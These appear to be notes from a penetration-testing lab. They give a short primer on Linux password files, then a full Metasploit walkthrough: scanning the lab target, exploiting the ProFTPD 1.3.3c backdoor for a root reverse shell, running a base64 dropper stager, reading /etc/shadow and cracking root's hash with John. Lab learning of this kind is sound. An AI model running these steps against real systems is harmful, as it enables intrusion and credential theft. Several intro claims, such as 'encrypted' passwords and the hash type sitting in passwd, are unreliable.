- Linux has multi-user support and as a result, multiple users can access the system simultaeneously. This can be seen as both an advantage from a security perspective, in that, multiple accounts offer multiple access vectors for attackers and therefore increase the overall risk of the server.
- All of the information for all accounts on Linux is stored in the passwd file located in /etc/passwd
- We cannot view the passwords for the users in the passwd file because they are encrypted and the passwd file is readable by any user on the system
- All the encrypted passwords for the users are stored in the shadow file. It can be found in /etc/shadow
- The shadow file can only be accessed and read by the root account, this is a very important security feature as it prevents other accounts on the system from accessing the hashed passwords.
- The passwd file gives us information in regards to the hashing algorithm that is being used and the password hash, this is very helpful as we are able to determine the type of hashing algorithm that is being used and its strength. We can determine this by looking at the number after the username encapsulated by the dollar symbol ($).

Value | Hashing Algorithm
:--: | :--:
$1 | MD5
$2 | Blowfish
$5 | SHA-256
$6 | SHA-512

---
In this lab, run the following auxiliary modules against the target:

- auxiliary/analyze/crack_linux

Instructions: 

- This lab is dedicated to you! No other users are on this network :)
- Once you start the lab, you will have access to a root terminal of a Kali instance
- Your Kali has an interface with IP address 192.X.Y.2. Run "ip addr" to know the values of X and Y.
- The target server should be located at the IP address 192.X.Y.3.
- Do not attack the gateway located at IP address 192.X.Y.1
- Use /**usr/share/metasploit-framework/data/wordlists/unix_users.txt** for username dictionary


[[ip]]

```
root@attackdefense:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: ip_vti0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000
    link/ipip 0.0.0.0 brd 0.0.0.0
7850: eth0@if7851: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:0a:01:00:08 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.1.0.8/16 brd 10.1.255.255 scope global eth0
       valid_lft forever preferred_lft forever
7853: eth1@if7854: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:c0:38:9b:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.56.155.2/24 brd 192.56.155.255 scope global eth1
       valid_lft forever preferred_lft forever
```

[[Hack2.0/NMAP|NMAP]]

```
root@attackdefense:~# nmap 192.56.155.3
Starting Nmap 7.70 ( https://nmap.org ) at 2023-07-22 10:30 UTC
Nmap scan report for target-1 (192.56.155.3)
Host is up (0.0000090s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
MAC Address: 02:42:C0:38:9B:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.19 seconds
root@attackdefense:~# nmap -p21 -sV 192.56.155.3
Starting Nmap 7.70 ( https://nmap.org ) at 2023-07-22 10:30 UTC
Nmap scan report for target-1 (192.56.155.3)
Host is up (0.000044s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.3c
MAC Address: 02:42:C0:38:9B:03 (Unknown)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.48 seconds
```

[[metasploit]]

```
Papers: No Result
root@attackdefense:~# service postgresql start && msfconsole
Starting PostgreSQL 12 database server: main.

       =[ metasploit v5.0.83-dev                          ]
+ -- --=[ 2003 exploits - 1100 auxiliary - 340 post       ]
+ -- --=[ 564 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Enable verbose logging with set VERBOSE true

msf5 > setg rhosts 192.56.155.3
rhosts => 192.56.155.3
msf5 > search proftpd

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  exploit/freebsd/ftp/proftp_telnet_iac        2010-11-01       great      Yes    ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (FreeBSD)
   1  exploit/linux/ftp/proftp_sreplace            2006-11-26       great      Yes    ProFTPD 1.2 - 1.3.0 sreplace Buffer Overflow (Linux)
   2  exploit/linux/ftp/proftp_telnet_iac          2010-11-01       great      Yes    ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (Linux)
   3  exploit/linux/misc/netsupport_manager_agent  2011-01-08       average    No     NetSupport Manager Agent Remote Buffer Overflow
   4  exploit/unix/ftp/proftpd_133c_backdoor       2010-12-02       excellent  No     ProFTPD-1.3.3c Backdoor Command Execution
   5  exploit/unix/ftp/proftpd_modcopy_exec        2015-04-22       excellent  Yes    ProFTPD 1.3.5 Mod_Copy Command Execution


msf5 > use 4
msf5 exploit(unix/ftp/proftpd_133c_backdoor) > options

Module options (exploit/unix/ftp/proftpd_133c_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.56.155.3     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(unix/ftp/proftpd_133c_backdoor) > run

[*] Started reverse TCP double handler on 192.56.155.2:4444 
[*] 192.56.155.3:21 - Sending Backdoor Command
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo HYV9sfjpu5BbW1hx;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "HYV9sfjpu5BbW1hx\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (192.56.155.2:4444 -> 192.56.155.3:46600) at 2023-07-22 10:33:09 +0000

/bin/bash -i
bash: cannot set terminal process group (9): Inappropriate ioctl for device
bash: no job control in this shell
root@victim-1:/# id
id
uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
root@victim-1:/# ^Z
Background session 1? [y/N]  y
msf5 exploit(unix/ftp/proftpd_133c_backdoor) > sessions

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  1         shell cmd/unix               192.56.155.2:4444 -> 192.56.155.3:46600 (192.56.155.3)

msf5 exploit(unix/ftp/proftpd_133c_backdoor) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.56.155.2:4433 
[*] Sending stage (980808 bytes) to 192.56.155.3
[*] Meterpreter session 2 opened (192.56.155.2:4433 -> 192.56.155.3:43988) at 2023-07-22 10:34:14 +0000
[-] Error: Unable to execute the following command: "echo -n f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAjPAAAASgEAAAcAAAAAEAAAagpeMdv341NDU2oCsGaJ4c2Al1towDibAmgCABFRieFqZlhQUVeJ4UPNgIXAeRlOdD1oogAAAFhqAGoFieMxyc2AhcB5vesnsge5ABAAAInjwesMweMMsH3NgIXAeBBbieGZsmqwA82AhcB4Av/huAEAAAC7AQAAAM2A>>'/tmp/EZUai.b64' ; ((which base64 >&2 && base64 -d -) || (which base64 >&2 && base64 --decode -) || (which openssl >&2 && openssl enc -d -A -base64 -in /dev/stdin) || (which python >&2 && python -c 'import sys, base64; print base64.standard_b64decode(sys.stdin.read());') || (which perl >&2 && perl -MMIME::Base64 -ne 'print decode_base64($_)')) 2> /dev/null > '/tmp/uFItM' < '/tmp/EZUai.b64' ; chmod +x '/tmp/uFItM' ; '/tmp/uFItM' & sleep 2 ; rm -f '/tmp/uFItM' ; rm -f '/tmp/EZUai.b64'"
[-] Output: "[1] 38"
msf5 exploit(unix/ftp/proftpd_133c_backdoor) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                                       Connection
  --  ----  ----                   -----------                                                       ----------
  1         shell cmd/unix                                                                           192.56.155.2:4444 -> 192.56.155.3:46600 (192.56.155.3)
  2         meterpreter x86/linux  no-user @ victim-1 (uid=0, gid=0, euid=0, egid=0) @ 192.56.155.3  192.56.155.2:4433 -> 192.56.155.3:43988 (192.56.155.3)

msf5 exploit(unix/ftp/proftpd_133c_backdoor) > session 2
[-] Unknown command: session.
msf5 exploit(unix/ftp/proftpd_133c_backdoor) > sessions 2
[*] Starting interaction with 2...

meterpreter > sysinfo
Computer     : 192.56.155.3
OS           : Ubuntu 18.04 (Linux 5.4.0-153-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > getuid
Server username: no-user @ victim-1 (uid=0, gid=0, euid=0, egid=0)
meterpreter > cat /etc/shadow
root:$6$sgewtGbw$ihhoUYASuXTh7Dmw0adpC7a3fBGkf9hkOQCffBQRMIF8/0w6g/Mh4jMWJ0yEFiZyqVQhZ4.vuS8XOyq.hLQBb.:18348:0:99999:7:::
daemon:*:18311:0:99999:7:::
bin:*:18311:0:99999:7:::
sys:*:18311:0:99999:7:::
sync:*:18311:0:99999:7:::
games:*:18311:0:99999:7:::
man:*:18311:0:99999:7:::
lp:*:18311:0:99999:7:::
mail:*:18311:0:99999:7:::
news:*:18311:0:99999:7:::
uucp:*:18311:0:99999:7:::
proxy:*:18311:0:99999:7:::
www-data:*:18311:0:99999:7:::
backup:*:18311:0:99999:7:::
list:*:18311:0:99999:7:::
irc:*:18311:0:99999:7:::
gnats:*:18311:0:99999:7:::
nobody:*:18311:0:99999:7:::
_apt:*:18311:0:99999:7:::
meterpreter > 
Background session 2? [y/N]  
msf5 exploit(unix/ftp/proftpd_133c_backdoor) > hashdump
[-] Unknown command: hashdump.
msf5 exploit(unix/ftp/proftpd_133c_backdoor) > search hashdump

Matching Modules
================

   #   Name                                                  Disclosure Date  Rank    Check  Description
   -   ----                                                  ---------------  ----    -----  -----------
   0   auxiliary/analyze/crack_databases                                      normal  No     Password Cracker: Databases
   1   auxiliary/scanner/mssql/mssql_hashdump                                 normal  No     MSSQL Password Hashdump
   2   auxiliary/scanner/mysql/mysql_authbypass_hashdump     2012-06-09       normal  No     MySQL Authentication Bypass Password Dump
   3   auxiliary/scanner/mysql/mysql_hashdump                                 normal  No     MYSQL Password Hashdump
   4   auxiliary/scanner/oracle/oracle_hashdump                               normal  No     Oracle Password Hashdump
   5   auxiliary/scanner/postgres/postgres_hashdump                           normal  No     Postgres Password Hashdump
   6   auxiliary/scanner/smb/impacket/secretsdump                             normal  No     DCOM Exec
   7   post/aix/hashdump                                                      normal  No     AIX Gather Dump Password Hashes
   8   post/android/gather/hashdump                                           normal  No     Android Gather Dump Password Hashes for Android Systems
   9   post/bsd/gather/hashdump                                               normal  No     BSD Dump Password Hashes
   10  post/linux/gather/hashdump                                             normal  No     Linux Gather Dump Password Hashes for Linux Systems
   11  post/osx/gather/hashdump                                               normal  No     OS X Gather Mac OS X Password Hash Collector
   12  post/solaris/gather/hashdump                                           normal  No     Solaris Gather Dump Password Hashes for Solaris Systems
   13  post/windows/gather/credentials/domain_hashdump                        normal  No     Windows Domain Controller Hashdump
   14  post/windows/gather/credentials/mcafee_vse_hashdump                    normal  No     McAfee Virus Scan Enterprise Password Hashes Dump
   15  post/windows/gather/credentials/mssql_local_hashdump                   normal  No     Windows Gather Local SQL Server Hash Dump
   16  post/windows/gather/hashdump                                           normal  No     Windows Gather Local User Account Password Hashes (Registry)
   17  post/windows/gather/smart_hashdump                                     normal  No     Windows Gather Local and Domain Controller Account Password Hashes


msf5 exploit(unix/ftp/proftpd_133c_backdoor) > use 10
msf5 post(linux/gather/hashdump) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                                       Connection
  --  ----  ----                   -----------                                                       ----------
  1         shell cmd/unix                                                                           192.56.155.2:4444 -> 192.56.155.3:46600 (192.56.155.3)
  2         meterpreter x86/linux  no-user @ victim-1 (uid=0, gid=0, euid=0, egid=0) @ 192.56.155.3  192.56.155.2:4433 -> 192.56.155.3:43988 (192.56.155.3)

msf5 post(linux/gather/hashdump) > set session 2
session => 2
msf5 post(linux/gather/hashdump) > run

[+] root:$6$sgewtGbw$ihhoUYASuXTh7Dmw0adpC7a3fBGkf9hkOQCffBQRMIF8/0w6g/Mh4jMWJ0yEFiZyqVQhZ4.vuS8XOyq.hLQBb.:0:0:root:/root:/bin/bash
[+] Unshadowed Password File: /root/.msf4/loot/20230722103704_default_192.56.155.3_linux.hashes_426506.txt
[*] Post module execution completed
msf5 post(linux/gather/hashdump) > search crack_linux

Matching Modules
================

   #  Name                           Disclosure Date  Rank    Check  Description
   -  ----                           ---------------  ----    -----  -----------
   0  auxiliary/analyze/crack_linux                   normal  No     Password Cracker: Linux


msf5 post(linux/gather/hashdump) > use 0
msf5 auxiliary(analyze/crack_linux) > options

Module options (auxiliary/analyze/crack_linux):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   BLOWFISH              false            no        Include BLOWFISH hashes (Very Slow)
   BSDI                  true             no        Include BSDI hashes
   CONFIG                                 no        The path to a John config file to use instead of the default
   CRACKER_PATH                           no        The absolute path to the cracker executable
   CUSTOM_WORDLIST                        no        The path to an optional custom wordlist
   DES                   true             no        Indlude DES hashes
   FORK                  1                no        Forks for John the Ripper to use
   INCREMENTAL           true             no        Run in incremental mode
   ITERATION_TIMEOUT                      no        The max-run-time for each iteration of cracking
   KORELOGIC             false            no        Apply the KoreLogic rules to John the Ripper Wordlist Mode(slower)
   MD5                   true             no        Include MD5 hashes
   MUTATE                false            no        Apply common mutations to the Wordlist (SLOW)
   POT                                    no        The path to a John POT file to use instead of the default
   SHA256                false            no        Include SHA256 hashes (Very Slow)
   SHA512                false            no        Include SHA512 hashes (Very Slow)
   USE_CREDS             true             no        Use existing credential data saved in the database
   USE_DB_INFO           true             no        Use looted database schema info to seed the wordlist
   USE_DEFAULT_WORDLIST  true             no        Use the default metasploit wordlist
   USE_HOSTNAMES         true             no        Seed the wordlist with hostnames from the workspace
   USE_ROOT_WORDS        true             no        Use the Common Root Words Wordlist
   WORDLIST              true             no        Run in wordlist mode


Auxiliary action:

   Name  Description
   ----  -----------
   john  Use John the Ripper


msf5 auxiliary(analyze/crack_linux) > set SHA512 true 
SHA512 => true
msf5 auxiliary(analyze/crack_linux) > run
[*] Running module against 192.56.155.3
Created directory: /root/.john

[+] john Version Detected: 1.9.0-jumbo-1 OMP
[*] Hashes Written out to /tmp/hashes_tmp20230722-114-1tbxixz
[*] Wordlist file written out to /tmp/jtrtmp20230722-114-rkbapa
[*] Checking md5crypt hashes already cracked...
[*] Cracking md5crypt hashes in single mode...
[*]    Cracking Command: /usr/sbin/john --session=Ehldw6sc --nolog --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/john.pot --format=md5crypt --wordlist=/tmp/jtrtmp20230722-114-rkbapa --rules=single /tmp/hashes_tmp20230722-114-1tbxixz
Using default input encoding: UTF-8
[*] Cracking md5crypt hashes in normal mode
[*]    Cracking Command: /usr/sbin/john --session=Ehldw6sc --nolog --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/john.pot --format=md5crypt /tmp/hashes_tmp20230722-114-1tbxixz
Using default input encoding: UTF-8
[*] Cracking md5crypt hashes in incremental mode...
[*]    Cracking Command: /usr/sbin/john --session=Ehldw6sc --nolog --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/john.pot --format=md5crypt --incremental=Digits /tmp/hashes_tmp20230722-114-1tbxixz
Using default input encoding: UTF-8
[*] Cracking md5crypt hashes in wordlist mode...
[*]    Cracking Command: /usr/sbin/john --session=Ehldw6sc --nolog --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/john.pot --format=md5crypt --wordlist=/tmp/jtrtmp20230722-114-rkbapa --rules=wordlist /tmp/hashes_tmp20230722-114-1tbxixz
Using default input encoding: UTF-8
[+] Cracked Hashes
==============

 DB ID  Hash Type  Username  Cracked Password  Method
 -----  ---------  --------  ----------------  ------

[*] Checking descrypt hashes already cracked...
[*] Cracking descrypt hashes in single mode...
[*]    Cracking Command: /usr/sbin/john --session=vdyqy2MC --nolog --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/john.pot --format=descrypt --wordlist=/tmp/jtrtmp20230722-114-rkbapa --rules=single /tmp/hashes_tmp20230722-114-1tbxixz
Using default input encoding: UTF-8
[*] Cracking descrypt hashes in normal mode
[*]    Cracking Command: /usr/sbin/john --session=vdyqy2MC --nolog --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/john.pot --format=descrypt /tmp/hashes_tmp20230722-114-1tbxixz
Using default input encoding: UTF-8
[*] Cracking descrypt hashes in incremental mode...
[*]    Cracking Command: /usr/sbin/john --session=vdyqy2MC --nolog --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/john.pot --format=descrypt --incremental=Digits /tmp/hashes_tmp20230722-114-1tbxixz
Using default input encoding: UTF-8
[*] Cracking descrypt hashes in wordlist mode...
[*]    Cracking Command: /usr/sbin/john --session=vdyqy2MC --nolog --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/john.pot --format=descrypt --wordlist=/tmp/jtrtmp20230722-114-rkbapa --rules=wordlist /tmp/hashes_tmp20230722-114-1tbxixz
Using default input encoding: UTF-8
[+] Cracked Hashes
==============

 DB ID  Hash Type  Username  Cracked Password  Method
 -----  ---------  --------  ----------------  ------

[*] Checking bsdicrypt hashes already cracked...
[*] Cracking bsdicrypt hashes in single mode...
[*]    Cracking Command: /usr/sbin/john --session=OC399xDU --nolog --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/john.pot --format=bsdicrypt --wordlist=/tmp/jtrtmp20230722-114-rkbapa --rules=single /tmp/hashes_tmp20230722-114-1tbxixz
Using default input encoding: UTF-8
[*] Cracking bsdicrypt hashes in normal mode
[*]    Cracking Command: /usr/sbin/john --session=OC399xDU --nolog --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/john.pot --format=bsdicrypt /tmp/hashes_tmp20230722-114-1tbxixz
Using default input encoding: UTF-8
[*] Cracking bsdicrypt hashes in incremental mode...
[*]    Cracking Command: /usr/sbin/john --session=OC399xDU --nolog --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/john.pot --format=bsdicrypt --incremental=Digits /tmp/hashes_tmp20230722-114-1tbxixz
Using default input encoding: UTF-8
[*] Cracking bsdicrypt hashes in wordlist mode...
[*]    Cracking Command: /usr/sbin/john --session=OC399xDU --nolog --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/john.pot --format=bsdicrypt --wordlist=/tmp/jtrtmp20230722-114-rkbapa --rules=wordlist /tmp/hashes_tmp20230722-114-1tbxixz
Using default input encoding: UTF-8
[+] Cracked Hashes
==============

 DB ID  Hash Type  Username  Cracked Password  Method
 -----  ---------  --------  ----------------  ------

[*] Checking sha512crypt hashes already cracked...
[*] Cracking sha512crypt hashes in single mode...
[*]    Cracking Command: /usr/sbin/john --session=PUeZorS7 --nolog --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/john.pot --format=sha512crypt --wordlist=/tmp/jtrtmp20230722-114-rkbapa --rules=single /tmp/hashes_tmp20230722-114-1tbxixz
Using default input encoding: UTF-8
Will run 48 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
1g 0:00:00:05 DONE (2023-07-22 10:39) 0.2000g/s 1228p/s 1228c/s 1228C/s 1qwerty..afferent
Use the "--show" option to display all of the cracked passwords reliably
Session completed
[*] Cracking sha512crypt hashes in normal mode
[*]    Cracking Command: /usr/sbin/john --session=PUeZorS7 --nolog --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/john.pot --format=sha512crypt /tmp/hashes_tmp20230722-114-1tbxixz
Using default input encoding: UTF-8
[*] Cracking sha512crypt hashes in incremental mode...
[*]    Cracking Command: /usr/sbin/john --session=PUeZorS7 --nolog --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/john.pot --format=sha512crypt --incremental=Digits /tmp/hashes_tmp20230722-114-1tbxixz
Using default input encoding: UTF-8
[*] Cracking sha512crypt hashes in wordlist mode...
[*]    Cracking Command: /usr/sbin/john --session=PUeZorS7 --nolog --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/john.pot --format=sha512crypt --wordlist=/tmp/jtrtmp20230722-114-rkbapa --rules=wordlist /tmp/hashes_tmp20230722-114-1tbxixz
Using default input encoding: UTF-8
[+] Cracked Hashes
==============

 DB ID  Hash Type    Username  Cracked Password  Method
 -----  ---------    --------  ----------------  ------
 1      sha512crypt  root      password          Single

[*] Auxiliary module execution completed
msf5 auxiliary(analyze/crack_linux) >
```